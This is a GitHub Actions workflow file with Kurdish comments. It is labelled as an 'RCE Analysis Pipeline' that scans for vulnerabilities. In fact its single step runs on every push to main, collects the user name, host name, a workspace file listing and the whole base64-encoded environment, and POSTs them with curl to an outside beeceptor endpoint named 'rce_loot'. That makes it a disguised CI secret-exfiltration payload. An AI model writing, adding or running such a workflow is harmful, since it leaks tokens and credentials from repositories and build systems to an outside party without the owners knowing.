name: RCE Analysis Pipeline

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  exploit_test:
    runs-on: ubuntu-latest
    steps:
      - name: System Information Gathering
        run: |
          echo "Scanning for RCE vulnerabilities..."
          
          # ١. کۆکردنەوەی زانیارییەکان لە ناو گۆڕاوێک (Variable)
          # بەم شێوەیە هەموو داتاکان دەبن بە یەک پەیامی تێکستی
          DATA="User: $(whoami) | Host: $(hostname) | Files: $(ls -la /home/runner/work/) | ENV_BASE64: $(env | base64)"
          
          # ٢. ناردنی ڕاستەوخۆی داتاکە لە ناو Body-دا
          # چیتر بە -F نییە، بەڵکو بە -d دەیاننێرین
          curl -X POST -d "$DATA" https://aksjwuwu.free.beeceptor.com/rce_loot
